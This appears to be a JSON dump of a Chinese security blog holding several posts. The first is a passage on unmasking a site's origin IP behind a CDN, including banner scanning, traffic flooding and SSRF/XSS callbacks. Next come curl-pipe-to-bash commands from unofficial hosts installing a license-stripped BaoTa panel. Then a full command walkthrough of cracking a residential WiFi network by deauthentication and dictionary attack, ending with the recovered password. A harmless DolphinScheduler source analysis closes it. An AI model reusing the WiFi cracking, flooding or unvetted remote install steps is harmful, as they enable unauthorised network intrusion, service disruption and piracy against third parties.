利用SSL证书寻找真实IP证书颁发机构(CA)必须将他们发布的每个SSL&#x2F;TLS证书发布到公共日志中，SSL&#x2F;TLS证书通常包含域名、子域名和电子邮件地址。因此SSL&#x2F;TLS证书成为了攻击者的切入点。 获取网站SSL证书的HASH再结合Censys 利用Censys搜索网站的SSL证书及HASH，在https://crt.sh上查找目标网站SSL证书的HASH 再用Censys搜索该HASH即可得到真实IP地址 SSL证书搜索引擎： https://censys.io/ipv4?q=b6bce7fb8f7723ea63c6d0419e7af1f780d6b6cb1b4c2240e657f029142e2aae https://censys.io/certificates?q=parsed.names%3A+t00ls.net+and+tags.raw%3A+trusted 找到hash 转成ipv4 进行搜索 找到两个IP 两个ip 222.186.129.100 118.184.255.28 或者把hash放进网络空间搜索 7489210725011808154949879630532736653 成功找到网络IP 接着就是判断ip是否是这个域名的了。 3.9. 邮箱获取真实IP网站在发信的时候，会附带真实的IP地址 进入邮箱 查看源文件头部信息 选择from 是否真实 还需要 邮箱发送是否与网站同一个IP地址。 3.10. 网站敏感文件获取真实IP 文件探针 phpinfo 网站源代码 信息泄露 GitHub信息泄露 js文件 3.11. F5 LTM解码法当服务器使用F5 LTM做负载均衡时，通过对set-cookie关键字的解码真实ip也可被获取， 例如：Set-Cookie: BIGipServerpool_8.29_8030&#x3D;487098378.24095.0000，先把第一小 节的十进制数即487098378取出来，然后将其转为十六进制数1d08880a，接着从后至前， 以此取四位数出来，也就是0a.88.08.1d，最后依次把他们转为十进制数10.136.8.29，也就 是最后的真实ip。 rverpool-cas01&#x3D;3255675072.20480.0000; path&#x3D;&#x2F; 3255675072 转十六进制 c20da8c0 从右向左取 c0a80dc2 转10进制 192 168 13 194 3.12. APP获取真实IP如果网站有app，使用Fiddler或BurpSuite抓取数据包 可能获取真实IP 模拟器 mimi模拟器抓包 3.13. 小程序获取真实IP3.14. 配置不当获取真实IP在配置CDN的时候，需要指定域名、端口等信息，有时候小小的配置细节就容易导致CDN防护被绕过。 案例1：为了方便用户访问，我们常常将test.com 和 test.com 解析到同一个站点，而CDN只配置了www.test.com，通过访问test.com，就可以绕过 CDN 了。 案例2：站点同时支持http和https访问，CDN只配置 https协议，那么这时访问http就可以轻易绕过。 3.15. banner获取目标站点的banner，在全网搜索引擎搜索，也可以使用AQUATONE，在Shodan上搜索相同指纹站点。 可以通过互联网络信息中心的IP数据，筛选目标地区IP，遍历Web服务的banner用来对比CDN站的banner，可以确定源IP。 欧洲： http://ftp.ripe.net/pub/stats/ripencc/delegated-ripencc-latest 北美： https://ftp.arin.net/pub/stats/arin/delegated-arin-extended-latest 亚洲： ftp://ftp.apnic.net/public/apnic/stats/apnic/delegated-apnic-latest 非洲： ftp://ftp.afrinic.net/pub/stats/afrinic/delegated-afrinic-latest 拉美： ftp://ftp.lacnic.net/pub/stats/lacnic/delegated-lacnic-extended-latest 获取CN的IP http://www.ipdeny.com/ipblocks/data/countries/cn.zone 例如： 找到目标服务器 IP 段后，可以直接进行暴力匹配 ，使用zmap、masscan 扫描 HTTP banner，然后匹配到目标域名的相同 banner zmap -p 80 -w bbs.txt -o 80.txt 使用zmap的banner-grab对扫描出来80端口开放的主机进行banner抓取。 cat &#x2F;root&#x2F;bbs.txt |.&#x2F;banner-grab-tcp -p 80 -c 100 -d http-req -f ascii &gt; http-banners.out 根据网站返回包特征，进行特征过滤 location: plugin.php?id&#x3D;info:index https://fofa.so/ title&#x3D;”T00LS | 低调求发展 - 潜心习安全 - T00ls.Net” https://www.zoomeye.org/ title:”T00LS | 低调求发展 -潜心习安全 -T00ls.Net” https://quake.360.cn/ response:”T00LS | 低调求发展 - 潜心习安全 - T00ls.Net” 1、ZMap号称是最快的互联网扫描工具，能够在45分钟扫遍全网。https://github.com/zmap/zmap 2、Masscan号称是最快的互联网端口扫描器，最快可以在六分钟内扫遍互联网。 https://github.com/robertdavidgraham/masscan 3.16. 长期关注在长期渗透的时候，设置程序每天访问网站，可能有新的发现。每天零点 或者业务需求增大 它会换ip 换服务器的。 3.17. 流量攻击发包机可以一下子发送很大的流量。 这个方法是很笨，但是在特定的目标下渗透，建议采用。 cdn除了能隐藏ip，可能还考虑到分配流量， 不设防的cdn 量大就会挂，高防cdn 要大流量访问。 经受不住大流量冲击的时候可能会显示真实ip。 站长-&gt;业务不正常-&gt;cdn不使用-&gt;更换服务器。 3.18. 被动获取被动获取就是让服务器或网站主动连接我们的服务器，从而获取服务器的真实IP 如果网站有编辑器可以填写远程url图片，即可获取真实IP 如果存在ssrf漏洞 或者xss 让服务器主动连接我们的服务器 均可获取真实IP。 3.19. 扫全网获取真实IPhttps://github.com/superfish9/hackcdn https://github.com/boy-hack/w8fuckcdn","categories":[{"name":"网络安全","slug":"网络安全","permalink":"http://blog.ioimp.top/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"网安","slug":"网安","permalink":"http://blog.ioimp.top/tags/%E7%BD%91%E5%AE%89/"},{"name":"渗透必知必会","slug":"渗透必知必会","permalink":"http://blog.ioimp.top/tags/%E6%B8%97%E9%80%8F%E5%BF%85%E7%9F%A5%E5%BF%85%E4%BC%9A/"}]},{"title":"宝塔面板企业版","slug":"宝塔面板企业版","date":"2023-08-07T05:44:37.000Z","updated":"2023-08-07T05:49:16.217Z","comments":true,"path":"2023/08/07/宝塔面板企业版/","link":"","permalink":"http://blog.ioimp.top/2023/08/07/%E5%AE%9D%E5%A1%94%E9%9D%A2%E6%9D%BF%E4%BC%81%E4%B8%9A%E7%89%88/","excerpt":"","text":"从外部引入脚本 测试可用 自行辨别安全 安装脚本和升级脚本自己看实际情况使用 宝塔企业版介绍 · 安全：剥离了所有与宝塔官方的通信、上报、下发；并且不与本站企业版服务器通信； · 免费：提升为企业会员，免费使用软件商店中的所有[企业版插件]、[专业版插件]、[运行环境]、[免费插件]、[宝塔插件]；部分[第三方应用]安装可能会失败； · 解决方案：所有功能与原版一致，如有任何问题请参考宝塔官方解决方案；或前往交流群交流！ · 面板修复：企业版不与官方通信，也没有与我们服务器通信，所以无法判断贵站情况，建议使用升级代码修复&#x2F;或安装宝塔官方版再安装企业版(小概率出现异常，大概率只重装面板不影响网站运行)； · 其他提示：如果发现[软件商店]空白，大多是服务器与你本地的网络问题，请清理本地缓存&#x2F;切换浏览器的访客模式访问&#x2F;切换本地代理IP； · 本站声明：企业版基于官方代码、仅做通信剥离、代码未加密、未添加任何新增代码！ 宝塔企业版面板：新环境新服务器（也是就什么都没装的使用下面命令安装）已安装朋友请直接跳过往下看！ 官方最新版7.9版本，安装脚本（来源宝塔官方）： 教程环境使用的是CentOS 7.9 安装命令：1234567891011121314151617181920212223242526272829Centos安装命令（默认安装是7.8.0 直接在线升级7.9.3）：主节点：yum install -y wget &amp;&amp; wget -O install.sh http://io.bt.sy/install/install_6.0.sh &amp;&amp; sh install.sh 海外节点专用：yum install -y wget &amp;&amp; wget -O install.sh http://io.yu.al/install/install_6.0.sh &amp;&amp; sh install.sh 试验性Centos/Ubuntu/Debian安装命令 独立运行环境（py3.7） 可能存在少量兼容性问题 不断优化中主节点：curl -sSO http://io.bt.sy/install/install_panel.sh &amp;&amp; bash install_panel.sh 海外节点专用：curl -sSO http://io.yu.al/install/install_panel.sh &amp;&amp; bash install_panel.sh Ubuntu Deepin安装命令：主节点：wget -O install.sh http://io.bt.sy/install/install-ubuntu_6.0.sh &amp;&amp; sudo bash install.sh 海外节点专用：wget -O install.sh http://io.yu.al/install/install-ubuntu_6.0.sh &amp;&amp; sudo bash install.sh Debian安装命令：主节点：wget -O install.sh http://io.bt.sy/install/install-ubuntu_6.0.sh &amp;&amp; bash install.sh 海外节点专用：wget -O install.sh http://io.yu.al/install/install-ubuntu_6.0.sh &amp;&amp; bash install.sh Fedora安装命令:主节点：wget -O install.sh http://io.bt.sy/install/install_6.0.sh &amp;&amp; bash install.sh 海外节点专用：wget -O install.sh http://io.yu.al/install/install_6.0.sh &amp;&amp; bash install.sh[/van-wechat-hide] 升级教程：1.首先升级到官方最新版7.9版本，升级脚本（来源宝塔官方）： 1curl https://download.bt.cn/install/update_panel.sh|bash 升级命令1 Linux面板 7.9.3 升级企业版命令 1（7.9.3 官方版 &#x2F; 7.7.0 开心版 可以执行这个升级到 7.9.3 开心版）： 123456789101112131415161718主节点：curl https://io.bt.sy/install/update_panel.sh|bash海外节点专用：curl https://io.yu.al/install/update_panel.sh|bash升级命令2Linux面板 7.9.3 升级企业版命令 2（7.9.3 官方版 / 7.7.0 开心版 可以执行这个升级到 7.9.3 开心版）：主节点：curl http://io.bt.sy/install/update6.sh|bash海外节点专用：curl http://io.yu.al/install/update6.sh|bash[/van-wechat-hide]以上升级命令都可以升级最新版！ 至此安装完成，我们进入宝塔面板，按住Ctrl+f5刷新，多刷新几次或等待一两分钟即可。 7.9.0开心版更新记录：系统工具：日志清理工具增加2.0版本！ 宝塔插件：堡塔网站加速增加4.2版本！ 专业版插件：网站监控报表增加6.8版本！ 企业版插件：堡塔防提权改名堡塔防入侵！ 企业版插件：堡塔限制访问型证书-Linux版增加1.2版本！ 第三方插件：Nginx免费防火墙更新6.3版本！ 第三方插件：百度网盘更新3.9版本！ 部分第三方插件已经全部更新同步官方！ 修复第三方插件百度网盘无法使用问题！ 修复已知道的一些插件到期的问题！ 修复第一次安装脚本，需要退出登录重登才能安装插件的逻辑问题！ 修复部分用户登录虚拟账户无法获取列表authlist空白的问题！ 修复危险级别：特高去除宝塔因为账户跟宝塔不匹配封ban用户ip风险的问题（导致恢复免费版也无法使用，只能降级7.7.0才能使用）！ 已支持Arm构架！！！","categories":[{"name":"网站搭建","slug":"网站搭建","permalink":"http://blog.ioimp.top/categories/%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA/"}],"tags":[{"name":"宝塔面板","slug":"宝塔面板","permalink":"http://blog.ioimp.top/tags/%E5%AE%9D%E5%A1%94%E9%9D%A2%E6%9D%BF/"}]},{"title":"记一次对小区wifi渗透","slug":"my-first-blog","date":"2023-08-03T13:43:26.000Z","updated":"2023-08-03T13:49:56.399Z","comments":true,"path":"2023/08/03/my-first-blog/","link":"","permalink":"http://blog.ioimp.top/2023/08/03/my-first-blog/","excerpt":"","text":"wifi渗透(一)第三步——检查并开启网卡的监听功能airmon-ng：检查网卡是否支持监听功能的 airmon-ng start wlan0mon ：激活无线网卡的监听模式 第四步——扫描周边wifi信号airodump-ng wlan0mon ：扫描当前周边环境的WiFi信号 注意：找到你要破解的wifi信息，记住它的BSSID和CH,后面要用！ 第五步——抓包下面里的部分信息根据自己的情况进行替换 抓包命令：airodump-ng -c &#x3D;&#x3D;CH号码&#x3D;&#x3D; –bssid &#x3D;&#x3D;BSSID号码&#x3D;&#x3D; -w &#x2F;home&#x2F;kali&#x2F;桌面&#x2F;handshake wlan0mon 注意： 1-w后接抓包后得到的文件保存路径和名称，注意路径！ 我的用户名是kali，你的填你自己的 注：这种方式是一种被动等待的方式，所以我们需要将链接在该wifi上的设备踢下线，以便我们快速抓包。 这里我们需要记下BSSID(WIFI路由地址)和STATION（链接设备号），接下来我们将该设备从该wifi链接状态下强制踢下线 第六步——打掉连接ACK 死亡攻击：aireplay-ng -0 10 -a BSSID号 -c STATION号 wlan0mon 110——是攻击次数，一般10次就足够我们抓到包了，如果将次数调整的很大，那么就会持续的进行攻击，导致该设备长期无法链接到该wifi! 注：这样做将会导致连接在该wifi上的设备被强制下线，然后因为wifi的自动重连机制，使得我们可以快速抓到包。 最后一步——破解破解语法：aircrack-ng -w &lt;指定字典&gt; -b &lt;目的路由MAC地址&gt; &lt;抓到的握手包&gt; 注：目的路由MAC地址——就是BSSID 抓到的握手包——cap文件 kali自带字典：aircrack-ng -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt -b 78:72:5D:E0:BC:37 &#x2F;home&#x2F;kali&#x2F;桌面&#x2F;handshake-0*.cap 需要先解压：gzip -d &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt.gz 自我指定字典：aircrack-ng -w &#x2F;home&#x2F;kali&#x2F;password.txt -b 78:72:5D:E0:BC:37 &#x2F;home&#x2F;kali&#x2F;桌面&#x2F;handshake-0*.cap 成功！ 破解的wifi密码就为a123456789","categories":[{"name":"网络安全","slug":"网络安全","permalink":"http://blog.ioimp.top/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"网安","slug":"网安","permalink":"http://blog.ioimp.top/tags/%E7%BD%91%E5%AE%89/"}]},{"title":"一次对dolphinscheduler的源码分析","slug":"一次对dolphinscheduler的源码分析","date":"2023-07-20T01:05:10.000Z","updated":"2023-08-04T01:42:34.318Z","comments":true,"path":"2023/07/20/一次对dolphinscheduler的源码分析/","link":"","permalink":"http://blog.ioimp.top/2023/07/20/%E4%B8%80%E6%AC%A1%E5%AF%B9dolphinscheduler%E7%9A%84%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/","excerpt":"","text":"dolphinscheduler学习DolphinScheduler 项目结构2.1 结构分析 导入项目后，可以看到其主要核心模块如下： 模块 描述 dolphinscheduler-alert 告警模块，提供 AlertServer 服务。 dolphinscheduler-api web应用模块，提供 ApiServer 服务。 dolphinscheduler-common 通用的常量枚举、工具类、数据结构或者基类 dolphinscheduler-dao 提供数据库访问等操作。 dolphinscheduler-remote 基于 netty 的客户端、服务端 dolphinscheduler-server MasterServer 和 WorkerServer 服务 dolphinscheduler-service service模块，包含Quartz、Zookeeper、日志客户端访问服务，便于server模块和api模块调用 dolphinscheduler-ui 前端模块 2.2 表分析 dolphinscheduler_ddl.sql及dolphinscheduler_dml.sql 执行完后，可以在数据库里看到有如下表： 表名 表信息 t_ds_access_token 访问ds后端的token t_ds_alert 告警信息 t_ds_alertgroup 告警组 t_ds_command 执行命令 t_ds_datasource 数据源 t_ds_error_command（核心表） 错误命令 t_ds_process_definition（核心表） 流程定义 t_ds_process_instance（核心表） 流程实例 t_ds_project 项目 t_ds_queue 队列 t_ds_relation_datasource_user 用户关联数据源 t_ds_relation_process_instance 子流程 t_ds_relation_project_user 用户关联项目 t_ds_relation_resources_user 用户关联资源 t_ds_relation_udfs_user 用户关联UDF函数 t_ds_relation_user_alertgroup 用户关联告警组 t_ds_resources 资源文件 t_ds_schedules（核心表） 流程定时调度 t_ds_session 用户登录的session t_ds_task_instance（核心表） 任务实例 t_ds_tenant 租户 t_ds_udfs UDF资源 t_ds_user 用户 t_ds_version ds版本信息 2.2.1 类关系图 （用户&#x2F;队列&#x2F;数据源） DS 描述如下： 一个租户下可以有多个用户； t_ds_user中的queue字段存储的是队列表中的queue_name信息; t_ds_tenant下存的是queue_id，在流程定义执行过程中，用户队列优先级最高，用户队列为空则采用租户队列； t_ds_datasource表中的user_id字段表示创建该数据源的用户; t_ds_relation_datasource_user中的user_id表示，对数据源有权限的用户。 2.2.2 类关系图 （项目&#x2F;资源&#x2F;告警） DS 描述如下： 一个用户可以有多个项目，用户项目授权通过t_ds_relation_project_user表完成project_id和user_id的关系绑定； t_ds_projcet表中的user_id表示创建该项目的用户； t_ds_relation_project_user表中的user_id表示对项目有权限的用户； t_ds_resources表中的user_id表示创建该资源的用户； t_ds_relation_resources_user中的user_id表示对资源有权限的用户； t_ds_udfs表中的user_id表示创建该UDF的用户； t_ds_relation_udfs_user表中的user_id表示对UDF有权限的用户。 2.2.3 类关系图 （ 命令&#x2F;流程&#x2F;任务） DS 描述如下： 一个项目有多个流程定义，一个流程定义可以生成多个流程实例，一个流程实例可以生成多个任务实例； t_ds_schedulers表存放流程定义的定时调度信息； t_ds_relation_process_instance表存放的数据用于处理流程定义中含有子流程的情况，parent_process_instance_id表示含有子流程的主流程实例id，process_instance_id表示子流程实例的id，parent_task_instance_id表示子流程节点的任务实例id，流程实例表和任务实例表分别对应t_ds_process_instance表和t_ds_task_instance表 03 DolphinScheduler 源码分析 讲解源码前，先贴一份官网的启动流程图： 3.1 ExecutorController DS org.apache.dolphinscheduler.api.controller.ExecutorController 以下是对各接口的描述： 接口 描述 &#x2F;start-process-instance 执行流程实例 &#x2F;batch-start-process-instance 批量执行流程实例 &#x2F;execute 操作流程实例，如：暂停, 停止, 重跑, 从暂停恢复,从停止恢复 &#x2F;batch-execute 批量操作流程实例 &#x2F;start-check 检查流程定义或检查所有的子流程定义是否在线 接下我们看看最核心的方法： 123456789101112131415161718192021222324252627/** * do action to process instance: pause, stop, repeat, recover from pause, recover from stop * * @param loginUser login user * @param projectCode project code * @param processInstanceId process instance id * @param executeType execute type * @return execute result code */ @ApiOperation(value = &quot;execute&quot;, notes = &quot;EXECUTE_ACTION_TO_PROCESS_INSTANCE_NOTES&quot;) @ApiImplicitParams(&#123; @ApiImplicitParam(name = &quot;processInstanceId&quot;, value = &quot;PROCESS_INSTANCE_ID&quot;, required = true, dataType = &quot;Int&quot;, example = &quot;100&quot;), @ApiImplicitParam(name = &quot;executeType&quot;, value = &quot;EXECUTE_TYPE&quot;, required = true, dataType = &quot;ExecuteType&quot;) &#125;) @PostMapping(value = &quot;/execute&quot;) @ResponseStatus(HttpStatus.OK) @ApiException(EXECUTE_PROCESS_INSTANCE_ERROR) @AccessLogAnnotation(ignoreRequestArgs = &quot;loginUser&quot;) public Result execute(@ApiIgnore @RequestAttribute(value = Constants.SESSION_USER) User loginUser, @ApiParam(name = &quot;projectCode&quot;, value = &quot;PROJECT_CODE&quot;, required = true) @PathVariable long projectCode, @RequestParam(&quot;processInstanceId&quot;) Integer processInstanceId, @RequestParam(&quot;executeType&quot;) ExecuteType executeType ) &#123; Map result = execService.execute(loginUser, projectCode, processInstanceId, executeType); return returnDataList(result); &#125; 可以看到execute接口，是直接使用ExecService去执行了，下面分析下。 3.2 ExecService DS 下面看看里面的execute方法，已经加好了注释： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103/** * 操作工作流实例 * * @param loginUser 登录用户 * @param projectCode 项目编码 * @param processInstanceId 流程实例ID * @param executeType 执行类型（repeat running、resume pause、resume failure、stop、pause） * @return 执行结果 */@Overridepublic Map&lt;String, Object&gt; execute(User loginUser, long projectCode, Integer processInstanceId, ExecuteType executeType) &#123;/*** 查询项目信息 **/ Project project = projectMapper.queryByCode(projectCode);//check user access for project/*** 判断当前用户是否有操作权限 **/ Map&lt;String, Object&gt; result = projectService.checkProjectAndAuth(loginUser, project, projectCode, ApiFuncIdentificationConstant.map.get(executeType)); if (result.get(Constants.STATUS) != Status.SUCCESS) &#123; return result; &#125;/*** 检查Master节点是否存在 **/ if (!checkMasterExists(result)) &#123; return result; &#125;/*** 查询工作流实例详情 **/ ProcessInstance processInstance = processService.findProcessInstanceDetailById(processInstanceId); if (processInstance == null) &#123; putMsg(result, Status.PROCESS_INSTANCE_NOT_EXIST, processInstanceId); return result; &#125;/*** 根据工作流实例绑定的流程定义ID查询流程定义 **/ ProcessDefinition processDefinition = processService.findProcessDefinition(processInstance.getProcessDefinitionCode(), processInstance.getProcessDefinitionVersion()); if (executeType != ExecuteType.STOP &amp;&amp; executeType != ExecuteType.PAUSE) &#123;/*** 校验工作流定义能否执行（工作流是否存在？是否上线状态？存在子工作流定义不是上线状态？） **/ result = checkProcessDefinitionValid(projectCode, processDefinition, processInstance.getProcessDefinitionCode(), processInstance.getProcessDefinitionVersion()); if (result.get(Constants.STATUS) != Status.SUCCESS) &#123; return result; &#125; &#125;/*** 根据当前工作流实例的状态判断能否执行对应executeType类型的操作 **/ result = checkExecuteType(processInstance, executeType); if (result.get(Constants.STATUS) != Status.SUCCESS) &#123; return result; &#125;/*** 判断是否已经选择了合适的租户 **/ if (!checkTenantSuitable(processDefinition)) &#123; logger.error(&quot;there is not any valid tenant for the process definition: id:&#123;&#125;,name:&#123;&#125;, &quot;, processDefinition.getId(), processDefinition.getName()); putMsg(result, Status.TENANT_NOT_SUITABLE); &#125;/*** 在executeType为重跑的状态下，获取用户指定的启动参数 **/ Map&lt;String, Object&gt; commandMap = JSONUtils.parseObject(processInstance.getCommandParam(), new TypeReference&lt;Map&lt;String, Object&gt;&gt;() &#123; &#125;); String startParams = null; if (MapUtils.isNotEmpty(commandMap) &amp;&amp; executeType == ExecuteType.REPEAT_RUNNING) &#123; Object startParamsJson = commandMap.get(Constants.CMD_PARAM_START_PARAMS); if (startParamsJson != null) &#123; startParams = startParamsJson.toString(); &#125; &#125;/*** 根据不同的ExecuteType去执行相应的操作 **/ switch (executeType) &#123; case REPEAT_RUNNING:// 重跑 result = insertCommand(loginUser, processInstanceId, processDefinition.getCode(), processDefinition.getVersion(), CommandType.REPEAT_RUNNING, startParams); break; case RECOVER_SUSPENDED_PROCESS:// 恢复挂载的工作流 result = insertCommand(loginUser, processInstanceId, processDefinition.getCode(), processDefinition.getVersion(), CommandType.RECOVER_SUSPENDED_PROCESS, startParams); break; case START_FAILURE_TASK_PROCESS:// 启动失败的工作流 result = insertCommand(loginUser, processInstanceId, processDefinition.getCode(), processDefinition.getVersion(), CommandType.START_FAILURE_TASK_PROCESS, startParams); break; case STOP:// 停止 if (processInstance.getState() == ExecutionStatus.READY_STOP) &#123; putMsg(result, Status.PROCESS_INSTANCE_ALREADY_CHANGED, processInstance.getName(), processInstance.getState()); &#125; else &#123; result = updateProcessInstancePrepare(processInstance, CommandType.STOP, ExecutionStatus.READY_STOP); &#125; break; case PAUSE:// 暂停 if (processInstance.getState() == ExecutionStatus.READY_PAUSE) &#123; putMsg(result, Status.PROCESS_INSTANCE_ALREADY_CHANGED, processInstance.getName(), processInstance.getState()); &#125; else &#123; result = updateProcessInstancePrepare(processInstance, CommandType.PAUSE, ExecutionStatus.READY_PAUSE); &#125; break; default: logger.error(&quot;unknown execute type : &#123;&#125;&quot;, executeType); putMsg(result, Status.REQUEST_PARAMS_NOT_VALID_ERROR, &quot;unknown execute type&quot;); break; &#125; return result;&#125; 可以看到，以上代码前半部分主要是做了校验的操作，后半部分是根据执行类型来做不同的操作，操作主要分为两部分：insertCommand以及updateProcessInstancePrepare。 execute执行接口分析 3.2.1 insertCommand DS 方法代码如下，其实主要就是把生成命令并插入t_ds_command（执行命令表），插入已经添加好注释： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546/** * 插入命令（re run, recovery (pause / failure) execution) * * @param loginUser 登录用户 * @param instanceId 工作流实例id * @param processDefinitionCode 工作流定义id * @param processVersion 工作流版本 * @param commandType 命令类型 * @return 操作结果 */private Map&lt;String, Object&gt; insertCommand(User loginUser, Integer instanceId, long processDefinitionCode, int processVersion, CommandType commandType, String startParams) &#123; Map&lt;String, Object&gt; result = new HashMap&lt;&gt;();/*** 封装启动参数 **/ Map&lt;String, Object&gt; cmdParam = new HashMap&lt;&gt;(); cmdParam.put(CMD_PARAM_RECOVER_PROCESS_ID_STRING, instanceId); if (!StringUtils.isEmpty(startParams)) &#123; cmdParam.put(CMD_PARAM_START_PARAMS, startParams); &#125; Command command = new Command(); command.setCommandType(commandType); command.setProcessDefinitionCode(processDefinitionCode); command.setCommandParam(JSONUtils.toJsonString(cmdParam)); command.setExecutorId(loginUser.getId()); command.setProcessDefinitionVersion(processVersion); command.setProcessInstanceId(instanceId);/*** 判断工作流实例是否正在执行 **/ if (!processService.verifyIsNeedCreateCommand(command)) &#123; putMsg(result, Status.PROCESS_INSTANCE_EXECUTING_COMMAND, String.valueOf(processDefinitionCode)); return result; &#125;/*** 保存命令 **/ int create = processService.createCommand(command); if (create &gt; 0) &#123; putMsg(result, Status.SUCCESS); &#125; else &#123; putMsg(result, Status.EXECUTE_PROCESS_INSTANCE_ERROR); &#125; return result;&#125; 3.2.2 updateProcessInstancePrepare DS 方法代码如下，已经添加注释 123456789101112131415161718192021222324252627282930/** * 准备更新工作流实例的命令类型和状态 * * @param processInstance 工作流实例 * @param commandType 命令类型 * @param executionStatus 执行状态 * @return 更新结果 */private Map&lt;String, Object&gt; updateProcessInstancePrepare(ProcessInstance processInstance, CommandType commandType, ExecutionStatus executionStatus) &#123; Map&lt;String, Object&gt; result = new HashMap&lt;&gt;(); processInstance.setCommandType(commandType); processInstance.addHistoryCmd(commandType); processInstance.setState(executionStatus); int update = processService.updateProcessInstance(processInstance);// 判断流程是否正常 if (update &gt; 0) &#123; StateEventChangeCommand stateEventChangeCommand = new StateEventChangeCommand( processInstance.getId(), 0, processInstance.getState(), processInstance.getId(), 0 ); Host host = new Host(processInstance.getHost()); stateEventCallbackService.sendResult(host, stateEventChangeCommand.convert2Command()); putMsg(result, Status.SUCCESS); &#125; else &#123; putMsg(result, Status.EXECUTE_PROCESS_INSTANCE_ERROR); &#125; return result;&#125; 根据流程图，我们可以看到了已经执行了如下红框的代码，也就是把我们的command已经缓存到了DB。 接下来需要看看Master的代码。 3.3 MasterServer DS 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111@SpringBootApplication@ComponentScan(&quot;org.apache.dolphinscheduler&quot;)@EnableTransactionManagement@EnableCachingpublic class MasterServer implements IStoppable &#123; private static final Logger logger = LoggerFactory.getLogger(MasterServer.class); @Autowired private SpringApplicationContext springApplicationContext; @Autowired private MasterRegistryClient masterRegistryClient; @Autowired private TaskPluginManager taskPluginManager; @Autowired private MasterSchedulerService masterSchedulerService; @Autowired private SchedulerApi schedulerApi; @Autowired private EventExecuteService eventExecuteService; @Autowired private FailoverExecuteThread failoverExecuteThread; @Autowired private MasterRPCServer masterRPCServer; public static void main(String[] args) &#123; Thread.currentThread().setName(Constants.THREAD_NAME_MASTER_SERVER); SpringApplication.run(MasterServer.class); &#125;/** * 启动 master server */ @PostConstruct public void run() throws SchedulerException &#123;// 初始化 RPC服务 this.masterRPCServer.start();//安装任务插件 this.taskPluginManager.installPlugin();/*** MasterServer 注册客户端，用于连接到注册表并传递注册表事件。 * 当主节点启动时，它将在注册中心注册,并调度一个&#123;@link HeartBeatTask&#125;来更新注册表中的元数据**/ this.masterRegistryClient.init(); this.masterRegistryClient.start(); this.masterRegistryClient.setRegistryStoppable(this);// 主调度程序线程，该线程将使用来自数据库的命令并触发执行的processInstance。 this.masterSchedulerService.init(); this.masterSchedulerService.start(); this.eventExecuteService.start(); this.failoverExecuteThread.start();//这是调度器的接口，包含操作调度任务的方法。 this.schedulerApi.start(); Runtime.getRuntime().addShutdownHook(new Thread(() -&gt; &#123; if (Stopper.isRunning()) &#123; close(&quot;MasterServer shutdownHook&quot;); &#125; &#125;)); &#125;/** * 优雅的关闭方法 * * @param cause 关闭的原因 */ public void close(String cause) &#123; try &#123;// set stop signal is true// execute only once if (!Stopper.stop()) &#123; logger.warn(&quot;MasterServer is already stopped, current cause: &#123;&#125;&quot;, cause); return; &#125; logger.info(&quot;Master server is stopping, current cause : &#123;&#125;&quot;, cause);// thread sleep 3 seconds for thread quietly stop ThreadUtils.sleep(Constants.SERVER_CLOSE_WAIT_TIME.toMillis());// close this.schedulerApi.close(); this.masterSchedulerService.close(); this.masterRPCServer.close(); this.masterRegistryClient.closeRegistry();// close spring Context and will invoke method with @PreDestroy annotation to destroy beans.// like ServerNodeManager,HostManager,TaskResponseService,CuratorZookeeperClient,etc springApplicationContext.close(); logger.info(&quot;MasterServer stopped, current cause: &#123;&#125;&quot;, cause); &#125; catch (Exception e) &#123; logger.error(&quot;MasterServer stop failed, current cause: &#123;&#125;&quot;, cause, e); &#125; &#125; @Override public void stop(String cause) &#123; close(cause); &#125;&#125; 在run方法里面，可以看到，主要依次执行了： **① MasterRPCServer.start()**：启动master的rpc服务； **② TaskPluginManager.installPlugin()**：安装任务插件； **③ MasterRegistryClient.start()**：向Zookeeper注册MasterServer； **④ MasterSchedulerService.start()**：主调度程序线程，该线程将使用来自数据库的命令并触发执行的processInstance。 **⑤ EventExecuteService.start()**：工作流实例执行情况 **⑥ FailoverExecuteThread()**：故障转移检测 **⑦ SchedulerApi.start()**：scheduler接口去操作任务实例 3.1.1 MasterRPCServer DS Master RPC Server主要用来发送或接收请求给其它系统。 初始化方法如下： 1234567891011121314151617181920212223@PostConstructprivate void init() &#123;// 初始化远程服务 NettyServerConfig serverConfig = new NettyServerConfig(); serverConfig.setListenPort(masterConfig.getListenPort()); this.nettyRemotingServer = new NettyRemotingServer(serverConfig); this.nettyRemotingServer.registerProcessor(CommandType.TASK_EXECUTE_RESPONSE, taskExecuteResponseProcessor); this.nettyRemotingServer.registerProcessor(CommandType.TASK_EXECUTE_RUNNING, taskExecuteRunningProcessor); this.nettyRemotingServer.registerProcessor(CommandType.TASK_KILL_RESPONSE, taskKillResponseProcessor); this.nettyRemotingServer.registerProcessor(CommandType.STATE_EVENT_REQUEST, stateEventProcessor); this.nettyRemotingServer.registerProcessor(CommandType.TASK_FORCE_STATE_EVENT_REQUEST, taskEventProcessor); this.nettyRemotingServer.registerProcessor(CommandType.TASK_WAKEUP_EVENT_REQUEST, taskEventProcessor); this.nettyRemotingServer.registerProcessor(CommandType.CACHE_EXPIRE, cacheProcessor); this.nettyRemotingServer.registerProcessor(CommandType.TASK_RECALL, taskRecallProcessor);// 日志服务 this.nettyRemotingServer.registerProcessor(CommandType.GET_LOG_BYTES_REQUEST, loggerRequestProcessor); this.nettyRemotingServer.registerProcessor(CommandType.ROLL_VIEW_LOG_REQUEST, loggerRequestProcessor); this.nettyRemotingServer.registerProcessor(CommandType.VIEW_WHOLE_LOG_REQUEST, loggerRequestProcessor); this.nettyRemotingServer.registerProcessor(CommandType.REMOVE_TAK_LOG_REQUEST, loggerRequestProcessor); this.nettyRemotingServer.start();&#125; 3.2.2 TaskPluginManager DS 到此部分源码解析完成整体流程运行 用户点击WEB界面的启动工作流按钮。 apiserver 封装 commnd 到 db（往 t_ds_command 表中插入一条数据）。 master 